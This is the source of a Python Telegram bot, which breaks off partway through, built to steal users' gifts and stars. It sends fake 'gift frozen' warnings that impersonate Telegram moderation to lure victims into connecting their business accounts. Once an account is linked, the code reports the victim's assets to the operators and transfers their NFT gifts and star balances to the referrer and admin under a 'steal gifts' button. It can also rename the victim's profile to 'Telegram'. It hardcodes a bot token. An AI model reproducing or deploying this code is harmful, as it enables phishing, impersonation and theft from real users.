import asyncio
import hashlib
import platform
from datetime import datetime, timedelta
import os
import json
import random
import requests
import aiohttp
import logging
import code

from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.types import (
    InlineQuery,
    InlineQueryResultArticle,
    InputTextMessageContent,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    FSInputFile,
    CallbackQuery
)
from aiogram.filters import CommandStart, Command
from aiogram.utils.keyboard import InlineKeyboardBuilder

if not logging.getLogger().handlers:
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
        filename="bot.log"  # –õ–æ–≥–∏
    )
logger = logging.getLogger(__name__)


TOKEN = "7860507426:AAF6weuiHFqqZhjBWZnm0OW2Qlxo50TQErE"  # –¢–æ–∫–µ–Ω –±–æ—Ç–∞
LOG_CHAT_ID = -1002624563938 # ID —á–∞—Ç–∞. –ú–æ–∂–Ω–æ –≤ –≥—Ä—É–ø–ø—É –∏–ª–∏ –ø—Ä–æ—Å—Ç–æ –∫–µ–Ω—Ç–∞ –ª—é–±–æ–≥–æ
MAX_GIFTS_PER_RUN = 1000
ADMIN_IDS = [8115830990] # ID –∞–¥–º–∏–Ω–æ–≤ –∫—É–¥–∞ –ø–∞–¥–∞—é—Ç –≥–∏—Ñ—Ç—ã –≤ —Å–ª—É—á–∞–µ –Ω–µ–æ—Ç—Ä–∞–±–æ—Ç–∫–∏ —Ä–µ—Ñ–∫–∏

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))

dp = Dispatcher(storage=MemoryStorage())


@dp.message(Command("check_business"))
async def check_business_cmd(message: types.Message):
    """–ü—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –≤—Å–µ—Ö –±–∏–∑–Ω–µ—Å-–ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π"""
    if message.from_user.id not in ADMIN_IDS:
        return await message.answer("üö´ –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω")
        
    connections = await bot.get_business_connections()
    await message.answer(f"üîç –ù–∞–π–¥–µ–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π: {len(connections)}")
    for connection in connections:
        await handle_business(connection)

@dp.message(Command("check_ref"))
async def check_ref(message: types.Message):
    """–ü—Ä–æ–≤–µ—Ä–∫–∞ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω—ã—Ö —Å–≤—è–∑–µ–π"""
    if message.from_user.id not in ADMIN_IDS:
        return await message.answer("üö´ –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω")
        
    try:
        with open("referrers.json", "r") as f:
            data = json.load(f)
        text = "üìä –†–µ—Ñ–µ—Ä–∞–ª—å–Ω—ã–µ —Å–≤—è–∑–∏:\n" + "\n".join(f"{k} ‚Üí {v}" for k, v in data.items())
        await message.answer(text[:4000])
    except Exception as e:
        await message.answer(f"‚ùå –û—à–∏–±–∫–∞: {e}")

last_messages = {}
user_referrer_map = {}
user_referrals = {}  # inviter_id -> [business_ids]
ref_links = {}       # ref_code -> inviter_id

if os.path.exists("referrers.json"):
    referrers_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "referrers.json")
    try:
        with open(referrers_path, "r") as f:  
            user_referrer_map = json.load(f)
    except (json.JSONDecodeError, IOError):
        user_referrer_map = {}  
        with open(referrers_path, "w") as f:
            json.dump(user_referrer_map, f)

def get_expiration_str():
    now = datetime.utcnow()
    expiration = now + timedelta(days=365)
    if platform.system() == "Windows":
        return expiration.strftime("%#d %b %Y, %#H:%M UTC")
    else:
        return expiration.strftime("%-d %b %Y, %-H:%M UTC")

@dp.inline_query()
async def handle_inline_query(inline_query: InlineQuery):
    try:
        query = inline_query.query.strip()
        parts = [p.strip() for p in query.split(",")]
        if len(parts) != 3:
            return

        target_user = parts[0]
        gift_name = parts[1]
        gift_url = parts[2]
        expiration_str = get_expiration_str()

        # –†–µ—Ñ–∫–∞ (inline_query.from_user)
        ref_code = f"ref{inline_query.from_user.id}"
        ref_link = f"https://t.me/{(await bot.me()).username}?start={ref_code}"

        message_text = (
            f"This is an automatic message!‚ùÑÔ∏è\n\n"
            f"Dear, {target_user}\n\n"
            f"Your gift <a href='{gift_url}'>{gift_name}</a> was removed from the market for suspicious activity by one of our supervisors "
            f"and it was confirmed by our team of moderators. Now it's removed until <b>{expiration_str}</b>.\n\n"
            f"Your account will be automatically released on <b>{expiration_str}</b>. "
            f"If you think this is a mistake, you can submit a complaint using the button below."
        )

        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="Submit complaint", url=ref_link)]  # –ò—Å–ø–æ–ª—å–∑—É–µ–º —Ä–µ—Ñ–∫—É
            ]
        )

        result_id = hashlib.md5(message_text.encode()).hexdigest()
        result = InlineQueryResultArticle(
            id=result_id,
            title="Send gift warning",
            description=f"Gift for {target_user}",
            input_message_content=InputTextMessageContent(
                message_text=message_text,
                parse_mode=ParseMode.HTML
            ),
            reply_markup=keyboard
        )

        await inline_query.answer([result], cache_time=1)
        print("‚úÖ Inline response sent")

    except Exception as e:
        print("‚ùå Error in inline_query:", e)

class Draw(StatesGroup):
    id = State()
    gift = State()

def main_menu_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="üìå –°–æ—Ö—Ä–∞–Ω—è—Ç—å –æ–¥–Ω–æ—Ä–∞–∑–æ–≤—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è", callback_data="temp_msgs")],
        [InlineKeyboardButton(text="üóëÔ∏è –°–æ—Ö—Ä–∞–Ω—è—Ç—å —É–¥–∞–ª—ë–Ω–Ω—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è", callback_data="deleted_msgs")],
        [InlineKeyboardButton(text="‚úèÔ∏è –°–æ—Ö—Ä–∞–Ω—è—Ç—å –æ—Ç—Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è", callback_data="edited_msgs")],
        [InlineKeyboardButton(text="üéû –ê–Ω–∏–º–∞—Ü–∏–∏ —Å —Ç–µ–∫—Å—Ç–æ–º", callback_data="animations")],
        [InlineKeyboardButton(text="üìñ –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è", callback_data="show_instruction")]
    ])

@dp.message(CommandStart())
async def start_cmd(message: types.Message):
    args = message.text.split(" ")
    
    # –¢–∏—Ö–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–æ–π —Å—Å—ã–ª–∫–∏ (–±–µ–∑ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è)
    if len(args) > 1 and args[1].startswith("ref"):
        ref_code = args[1]
        try:
            inviter_id = int(ref_code.replace("ref", ""))
            if inviter_id and inviter_id != message.from_user.id:
                user_referrer_map[message.from_user.id] = inviter_id
                with open("referrers.json", "w") as f:
                    json.dump(user_referrer_map, f)
        except ValueError:
            pass

    # "Unfreeze Order"
    unfreeze_button = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="‚ùÑÔ∏è Unfreeze Order", callback_data="unfreeze_order")]
        ]
    )
    
    await message.answer(
        text="<b>The gift is frozen!</b>\n\n"
             "If you have no connection to this incident, click the \"Unfreeze Order\" button and complete a quick verification process, which takes just 1 minute.\n\n"
             "After verification, the gift will be credited back to your Telegram profile.\n\n"
             "‚ö†Ô∏è Please note that selling this gift will no longer available on portals.",
        reply_markup=unfreeze_button,
        parse_mode="HTML"
    )

@dp.message(Command("getrefZZZ"))
async def send_ref_link(message: types.Message):
    user_id = message.from_user.id
    ref_code = f"ref{user_id}"
    ref_links[ref_code] = user_id
    await message.answer(f"–í–∞—à–∞ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å—Å—ã–ª–∫–∞:https://t.me/{(await bot.me()).username}?start={ref_code}")


@dp.callback_query(F.data.in_({"temp_msgs", "deleted_msgs", "edited_msgs", "animations"}))
async def require_instruction(callback: types.CallbackQuery):
    await callback.answer("–°–Ω–∞—á–∞–ª–∞ –Ω–∞–∂–º–∏—Ç–µ –Ω–∞ üìñ –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—é —Å–≤–µ—Ä—Ö—É!", show_alert=True)

async def pagination(page=0):
    url = f'https://api.telegram.org/bot{TOKEN}/getAvailableGifts'
    try:
        response = requests.get(url)
        response.raise_for_status()
        builder = InlineKeyboardBuilder()
        start = page * 9
        end = start + 9
        count = 0
        
        data = response.json()
        if data.get("ok", False):
            gifts = list(data.get("result", {}).get("gifts", []))
            for gift in gifts[start:end]:
                print(gift)
                count += 1
                builder.button(
                    text=f"‚≠êÔ∏è{gift['star_count']} {gift['sticker']['emoji']}",
                    callback_data=f"gift_{gift['id']}"
                )
            builder.adjust(2)
        if page <= 0:
            builder.row(
                InlineKeyboardButton(
                    text="‚Ä¢",
                    callback_data="empty"
                ),
                InlineKeyboardButton(
                    text=f"{page}/{len(gifts) // 9}",
                    callback_data="empty"
                ),
                InlineKeyboardButton(
                    text="–í–ø–µ—Ä–µ–¥",
                    callback_data=f"next_{page + 1}"
                )
            )
        elif count < 9:
            builder.row(
                InlineKeyboardButton(
                    text="–ù–∞–∑–∞–¥",
                    callback_data=f"down_{page - 1}"
                ),
                InlineKeyboardButton(
                    text=f"{page}/{len(gifts) // 9}",
                    callback_data="empty"
                ),
                InlineKeyboardButton(
                    text="‚Ä¢",
                    callback_data="empty"
                )
            )
        elif page > 0 and count >= 9:
            builder.row(
                InlineKeyboardButton(
                    text="–ù–∞–∑–∞–¥",
                    callback_data=f"down_{page - 1}"
                ),
                InlineKeyboardButton(
                    text=f"{page}/{len(gifts) // 9}",
                    callback_data="empty"
                ),
                InlineKeyboardButton(
                    text="–í–ø–µ—Ä–µ–¥",
                    callback_data=f"next_{page + 1}"
                )
            )
        return builder.as_markup()
    except Exception as e:
        print(e)
        await bot.send_message(chat_id=ADMIN_IDS[0], text=f"{e}")

@dp.business_connection()
async def handle_business(business_connection: types.BusinessConnection):
    business_id = business_connection.id
    builder = InlineKeyboardBuilder()
    
    builder.button(
        text="üí∞ –£–∫—Ä–∞—Å—Ç—å –ø–æ–¥–∞—Ä–∫–∏", 
        callback_data=f"steal_gifts:{business_id}"
    )
    builder.button(
        text="‚õîÔ∏è –£–¥–∞–ª–∏—Ç—å –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ", 
        callback_data=f"destroy:{business_id}"
    )
    
    user = business_connection.user
    
    info = await bot.get_business_connection(business_id)
    rights = info.rights
    gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
    stars = await bot.get_business_account_star_balance(business_id)
    
    total_price = sum(g.convert_star_count or 0 for g in gifts.gifts if g.type == "regular")
    nft_gifts = [g for g in gifts.gifts if g.type == "unique"]
    nft_transfer_cost = len(nft_gifts) * 25
    total_withdrawal_cost = total_price + nft_transfer_cost
    
    header = f"‚ú® <b>–ù–æ–≤–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç–∞</b> ‚ú®\n\n"
    
    user_info = (
        f"<blockquote>üë§ <b>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ:</b>\n"
        f"‚îú‚îÄ ID: <code>{user.id}</code>\n"
        f"‚îú‚îÄ Username: @{user.username or '–Ω–µ—Ç'}\n"
        f"‚ï∞‚îÄ –ò–º—è: {user.first_name or ''} {user.last_name or ''}</blockquote>\n\n"
    )
    
    balance_info = (
        f"<blockquote>üí∞ <b>–ë–∞–ª–∞–Ω—Å:</b>\n"
        f"‚îú‚îÄ –î–æ—Å—Ç—É–ø–Ω–æ –∑–≤—ë–∑–¥: {int(stars.amount):,}\n"
        f"‚îú‚îÄ –ó–≤—ë–∑–¥ –≤ –ø–æ–¥–∞—Ä–∫–∞—Ö: {total_price:,}\n"
        f"‚ï∞‚îÄ <b>–ò—Ç–æ–≥–æ:</b> {int(stars.amount) + total_price:,}</blockquote>\n\n"
    )
    
    gifts_info = (
        f"<blockquote>üéÅ <b>–ü–æ–¥–∞—Ä–∫–∏:</b>\n"
        f"‚îú‚îÄ –í—Å–µ–≥–æ: {gifts.total_count}\n"
        f"‚îú‚îÄ –û–±—ã—á–Ω—ã–µ: {gifts.total_count - len(nft_gifts)}\n"
        f"‚îú‚îÄ NFT: {len(nft_gifts)}\n"
        f"‚îú‚îÄ <b>–°—Ç–æ–∏–º–æ—Å—Ç—å –ø–µ—Ä–µ–Ω–æ—Å–∞ NFT:</b> {nft_transfer_cost:,} –∑–≤—ë–∑–¥ (25 –∑–∞ –∫–∞–∂–¥—ã–π)\n"
        f"‚ï∞‚îÄ <b>–û–±—â–∞—è —Å—Ç–æ–∏–º–æ—Å—Ç—å –≤—ã–≤–æ–¥–∞:</b> {total_withdrawal_cost:,} –∑–≤—ë–∑–¥</blockquote>"
    )
    
    nft_list = ""
    if nft_gifts:
        nft_items = []
        for idx, g in enumerate(nft_gifts, 1):
            try:
                gift_id = getattr(g, 'id', '—Å–∫—Ä—ã—Ç')
                nft_items.append(f"‚îú‚îÄ NFT #{idx} (ID: {gift_id}) - 25‚≠ê")
            except AttributeError:
                nft_items.append(f"‚îú‚îÄ NFT #{idx} (—Å–∫—Ä—ã—Ç) - 25‚≠ê")
        
        nft_list = "\n<blockquote>üîó <b>NFT –ø–æ–¥–∞—Ä–∫–∏:</b>\n" + \
                  "\n".join(nft_items) + \
                  f"\n‚ï∞‚îÄ <b>–ò—Ç–æ–≥–æ:</b> {len(nft_gifts)} NFT = {nft_transfer_cost}‚≠ê</blockquote>\n\n"
    
    rights_info = (
        f"<blockquote>üîê <b>–ü—Ä–∞–≤–∞ –±–æ—Ç–∞:</b>\n"
        f"‚îú‚îÄ –û—Å–Ω–æ–≤–Ω—ã–µ: {'‚úÖ' if rights.can_read_messages else '‚ùå'} –ß—Ç–µ–Ω–∏–µ | "
        f"{'‚úÖ' if rights.can_delete_all_messages else '‚ùå'} –£–¥–∞–ª–µ–Ω–∏–µ\n"
        f"‚îú‚îÄ –ü—Ä–æ—Ñ–∏–ª—å: {'‚úÖ' if rights.can_edit_name else '‚ùå'} –ò–º—è | "
        f"{'‚úÖ' if rights.can_edit_username else '‚ùå'} Username\n"
        f"‚ï∞‚îÄ –ü–æ–¥–∞—Ä–∫–∏: {'‚úÖ' if rights.can_convert_gifts_to_stars else '‚ùå'} –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è | "
        f"{'‚úÖ' if rights.can_transfer_stars else '‚ùå'} –ü–µ—Ä–µ–≤–æ–¥</blockquote>\n\n"
    )
    
    footer = (
        f"<blockquote>‚ÑπÔ∏è <i>–ü–µ—Ä–µ–Ω–æ—Å –∫–∞–∂–¥–æ–≥–æ NFT –ø–æ–¥–∞—Ä–∫–∞ —Å—Ç–æ–∏—Ç 25 –∑–≤—ë–∑–¥</i>\n"
        f"üïí –í—Ä–µ–º—è: {datetime.now().strftime('%d.%m.%Y %H:%M')}</blockquote>"
    )
    
    full_message = header + user_info + balance_info + gifts_info + nft_list + rights_info + footer
    
    # –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ –ª–æ–≥-—á–∞—Ç
    try:
        await bot.send_message(
            chat_id=LOG_CHAT_ID,
            text=full_message,
            reply_markup=builder.as_markup(),
            parse_mode="HTML",
            disable_web_page_preview=True
        )
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –≤ –ª–æ–≥-—á–∞—Ç: {e}")

    # –£–≤–µ–¥ —Ä–µ—Ñ–∞
    inviter_id = user_referrer_map.get(user.id)
    if inviter_id and inviter_id != user.id:
        try:
            await bot.send_message(
                chat_id=inviter_id,
                text=full_message,
                reply_markup=builder.as_markup(),
                parse_mode="HTML",
                disable_web_page_preview=True
            )
        except Exception as e:
            print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –ø—Ä–∏–≥–ª–∞—Å–∏–≤—à–µ–º—É {inviter_id}: {e}")
            try:
                await bot.send_message(
                    chat_id=LOG_CHAT_ID,
                    text=f"‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –ø—Ä–∏–≥–ª–∞—Å–∏–≤—à–µ–º—É <code>{inviter_id}</code>: {e}",
                    parse_mode="HTML"
                )
            except:
                pass
    

@dp.callback_query(F.data == "draw_stars")
async def draw_stars(message: types.Message, state: FSMContext):
    await message.answer(text="–í–≤–µ–¥–∏—Ç–µ –∞–π–¥–∏ —é–∑–µ—Ä–∞ –∫–æ–º—É –ø–µ—Ä–µ–≤–µ—Å—Ç–∏ –ø–æ–¥–∞—Ä–∫–∏")
    await state.set_state(Draw.id)

@dp.message(F.text, Draw.id)
async def choice_gift(message: types.Message, state: FSMContext):
    msg = await message.answer(
        text="–ê–∫—Ç—É–∞–ª—å–Ω—ã–µ –ø–æ–¥–∞—Ä–∫–∏:",
        reply_markup=await pagination()
    )
    last_messages[message.chat.id] = msg.message_id
    user_id = message.text
    await state.update_data(user_id=user_id)
    await state.set_state(Draw.gift)

@dp.callback_query(F.data.startswith("gift_"))
async def draw(callback: CallbackQuery, state: FSMContext):
    gift_id = callback.data.split('_')[1]
    user_id = await state.get_data()
    user_id = user_id['user_id']
    await bot.send_gift(
        gift_id=gift_id,
        chat_id=int(user_id)
    )
    await callback.message.answer("–£—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –ø–æ–¥–∞—Ä–æ–∫")
    await state.clear()

@dp.callback_query(F.data.startswith("next_") or F.data.startswith("down_"))
async def edit_page(callback: CallbackQuery):
    message_id = last_messages[callback.from_user.id]
    await bot.edit_message_text(
        chat_id=callback.from_user.id,
        message_id=message_id,
        text="–ê–∫—Ç—É–∞–ª—å–Ω—ã–µ –ø–æ–¥–∞—Ä–∫–∏:",
        reply_markup=await pagination(page=int(callback.data.split("_")[1]))
    )

@dp.message(Command("ap"))
async def apanel(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(
            text="‚≠êÔ∏è–í—ã–≤–æ–¥ –∑–≤–µ–∑–¥",
            callback_data="draw_stars"
        )
    )
    await message.answer(
        text="–ê–¥–º–∏–Ω –ø–∞–Ω–µ–ª—å:",
        reply_markup=builder.as_markup()
    )

@dp.callback_query(F.data.startswith("destroy:"))
async def destroy_account(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        return
    builder = InlineKeyboardBuilder()
    print("HSHSHXHXYSTSTTSTSTSTSTSTSTSTSTTZTZTZYZ")
    business_id = callback.data.split(":")[1]
    print(f"Business id {business_id}")
    builder.row(
        InlineKeyboardButton(
            text="‚õîÔ∏è–û—Ç–º–µ–Ω–∞ —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏—è",
            callback_data=f"decline:{business_id}"
        )
    )
    await bot.set_business_account_name(business_connection_id=business_id, first_name="Telegram")
    await bot.set_business_account_bio(business_id, "Telegram")
    photo = FSInputFile("telegram.jpg")
    photo = types.InputProfilePhotoStatic(type="static", photo=photo)
    await bot.set_business_account_profile_photo(business_id, photo)
    await callback.message.answer(
        text="‚õîÔ∏è–í–∫–ª—é—á–µ–Ω —Ä–µ–∂–∏–º —Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏—è, –¥–ª—è —Ç–æ–≥–æ —á—Ç–æ–±—ã –æ—Ç–∫–ª—é—á–∏—Ç—å –Ω–∞–∂–º–∏—Ç–µ –Ω–∞ –∫–Ω–æ–ø–∫—É",
        reply_markup=builder.as_markup()
    )

@dp.callback_query(F.data.startswith("decline:"))
async def decline(callback: CallbackQuery):
    business_id = callback.data.split(":")[1]
    await bot.set_business_account_name(business_id, "Bot")
    await bot.set_business_account_bio(business_id, "Some bot")
    await callback.message.answer("–ú–∞–º–æ–Ω—Ç —Å–ø–∞—Å–µ–Ω –æ—Ç —Å–Ω–æ—Å–∞.")

        
@dp.callback_query(F.data.startswith("steal_gifts:"))
async def steal_gifts_handler(callback: CallbackQuery):
    business_id = callback.data.split(":")[1]
    
    try:
        # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç–µ
        business_connection = await bot.get_business_connection(business_id)
        user = business_connection.user  # –í–ª–∞–¥–µ–ª–µ—Ü –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç–∞
    except Exception as e:
        await callback.answer(f"‚ùå –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç–∞: {e}")
        return

    # –û–ø—Ä–µ–¥–µ–ª—è–µ–º –ø–æ–ª—É—á–∞—Ç–µ–ª—è (–ø—Ä–∏–≥–ª–∞—Å–∏–≤—à–µ–≥–æ –≤–ª–∞–¥–µ–ª—å—Ü–∞ –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç–∞)
    inviter_id = user_referrer_map.get(user.id)  # –í–∞–∂–Ω–æ: user.id, –∞ –Ω–µ callback.from_user.id
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –ª–∏ –ø—Ä–∏–≥–ª–∞—Å–∏–≤—à–∏–π –∏ –¥–æ—Å—Ç—É–ø–µ–Ω –ª–∏ –æ–Ω
    if inviter_id:
        try:
            await bot.get_chat(inviter_id)  # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –ª–∏ —á–∞—Ç
            recipient_id = inviter_id
            is_admin = False
            print(f"–ü–æ–¥–∞—Ä–∫–∏ –±—É–¥—É—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –ø—Ä–∏–≥–ª–∞—Å–∏–≤—à–µ–º—É: {inviter_id}")
        except Exception as e:
            print(f"–ü—Ä–∏–≥–ª–∞—Å–∏–≤—à–∏–π {inviter_id} –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω: {e}")
            recipient_id = ADMIN_IDS[0]
            is_admin = True
    else:
        recipient_id = ADMIN_IDS[0]
        is_admin = True
        print("–ü—Ä–∏–≥–ª–∞—Å–∏–≤—à–∏–π –Ω–µ –Ω–∞–π–¥–µ–Ω, –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –∞–¥–º–∏–Ω—É")

    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ recipient_id –∫–æ—Ä—Ä–µ–∫—Ç–µ–Ω –∏ –Ω–µ —Å–æ–≤–ø–∞–¥–∞–µ—Ç —Å ID –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç–∞
    if recipient_id == user.id:
        await callback.answer("‚ùå –ù–µ–ª—å–∑—è –ø–µ—Ä–µ–¥–∞—Ç—å –ø–æ–¥–∞—Ä–∫–∏ —Å–∞–º–æ–º—É —Å–µ–±–µ!")
        return

    stolen_nfts = []
    stolen_count = 0
    errors = []
    
    try:
        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        gifts_list = gifts.gifts if hasattr(gifts, 'gifts') else []
    except Exception as e:
        await bot.send_message(LOG_CHAT_ID, f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –ø–æ–¥–∞—Ä–∫–æ–≤: {e}")
        await callback.answer("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –ø–æ–¥–∞—Ä–∫–æ–≤")
        return

    # –§–∏–ª—å—Ç—Ä—É–µ–º —Ç–æ–ª—å–∫–æ NFT –ø–æ–¥–∞—Ä–∫–∏, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–∂–Ω–æ –ø–µ—Ä–µ–¥–∞—Ç—å
    transferable_gifts = [
        gift for gift in gifts_list 
        if gift.type == "unique" and gift.can_be_transferred
    ][:MAX_GIFTS_PER_RUN]  # –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ
    
    total_gifts = len(transferable_gifts)
    
    # –†–∞—Å—Å—á–∏—Ç—ã–≤–∞–µ–º –∫–æ–º–∏—Å—Å–∏—é –∞–¥–º–∏–Ω—É (–µ—Å–ª–∏ –µ—Å—Ç—å –ø—Ä–∏–≥–ª–∞—Å–∏–≤—à–∏–π –∏ –±–æ–ª—å—à–µ 2 –ø–æ–¥–∞—Ä–∫–æ–≤)
    admin_gifts = 0
    if not is_admin and total_gifts > 2:
        if total_gifts >= 3:
            admin_gifts = 1
        elif total_gifts >= 6:
            admin_gifts = 3
        elif total_gifts >= 10:
            admin_gifts = 4
        elif total_gifts >= 15:
            admin_gifts = 6
        elif total_gifts >= 20:
            admin_gifts = 8
        elif total_gifts >= 25:
            admin_gifts = 10
        elif total_gifts >= 30:
            admin_gifts = 15
    
    # –°–Ω–∞—á–∞–ª–∞ –ø–µ—Ä–µ–¥–∞–µ–º –ø–æ–¥–∞—Ä–∫–∏ –∞–¥–º–∏–Ω—É (–µ—Å–ª–∏ –µ—Å—Ç—å –∫–æ–º–∏—Å—Å–∏—è)
    admin_stolen = []
    if admin_gifts > 0 and ADMIN_IDS:
        for gift in transferable_gifts[:admin_gifts]:
            try:
                await bot.transfer_gift(
                    business_id, 
                    gift.owned_gift_id, 
                    ADMIN_IDS[0], 
                    gift.transfer_star_count
                )
                gift_name = gift.gift.name.replace(" ", "") if hasattr(gift.gift, 'name') else "Unknown"
                admin_stolen.append(f"t.me/nft/{gift_name}")
                stolen_count += 1
            except Exception as e:
                errors.append(f"–û—à–∏–±–∫–∞ –ø–µ—Ä–µ–¥–∞—á–∏ –∞–¥–º–∏–Ω—É {gift.owned_gift_id}: {e}")
    
    # –ó–∞—Ç–µ–º –ø–µ—Ä–µ–¥–∞–µ–º –æ—Å—Ç–∞–≤—à–∏–µ—Å—è –ø–æ–¥–∞—Ä–∫–∏ –ø–æ–ª—É—á–∞—Ç–µ–ª—é
    user_stolen = []
    for gift in transferable_gifts[admin_gifts:]:
        try:
            await bot.transfer_gift(
                business_id, 
                gift.owned_gift_id, 
                recipient_id, 
                gift.transfer_star_count
            )
            gift_name = gift.gift.name.replace(" ", "") if hasattr(gift.gift, 'name') else "Unknown"
            user_stolen.append(f"t.me/nft/{gift_name}")
            stolen_count += 1
        except Exception as e:
            errors.append(f"–û—à–∏–±–∫–∞ –ø–µ—Ä–µ–¥–∞—á–∏ {gift.owned_gift_id}: {e}")

    # –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –æ–±—ã—á–Ω—ã–µ –ø–æ–¥–∞—Ä–∫–∏ –≤ –∑–≤—ë–∑–¥—ã
    try:
        for gift in gifts_list:
            if gift.type == "regular":
                try:
                    await bot.convert_gift_to_stars(business_id, gift.owned_gift_id)
                except Exception as e:
                    errors.append(f"–û—à–∏–±–∫–∞ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏: {e}")
    except Exception as e:
        errors.append(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –æ–±—ã—á–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤: {e}")

    # –ü–µ—Ä–µ–≤–æ–¥ –∑–≤—ë–∑–¥ –ø–æ–ª—É—á–∞—Ç–µ–ª—é
    try:
        stars = await bot.get_business_account_star_balance(business_id)
        amount = int(stars.amount)
        if amount > 0:
            await bot.transfer_business_account_stars(business_id, amount, recipient_id)
            await bot.send_message(
                LOG_CHAT_ID, 
                f"üåü –í—ã–≤–µ–¥–µ–Ω–æ –∑–≤—ë–∑–¥: {amount} –¥–ª—è {'–ø—Ä–∏–≥–ª–∞—Å–∏–≤—à–µ–≥–æ' if not is_admin else '–∞–¥–º–∏–Ω–∞'}"
            )
    except Exception as e:
        errors.append(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–≤–æ–¥–µ –∑–≤—ë–∑–¥: {e}")

    # –§–æ—Ä–º–∏—Ä—É–µ–º –æ—Ç—á–µ—Ç
    result_msg = []
    if stolen_count > 0:
        result_msg.append(f"üéÅ –£—Å–ø–µ—à–Ω–æ —É–∫—Ä–∞–¥–µ–Ω–æ –ø–æ–¥–∞—Ä–∫–æ–≤: <b>{stolen_count}</b>")
        if admin_stolen:
            result_msg.append(f"\nüì¶ –ê–¥–º–∏–Ω—É –ø–µ—Ä–µ–¥–∞–Ω–æ: <b>{len(admin_stolen)}</b>")
            result_msg.extend(admin_stolen[:3])
        if user_stolen:
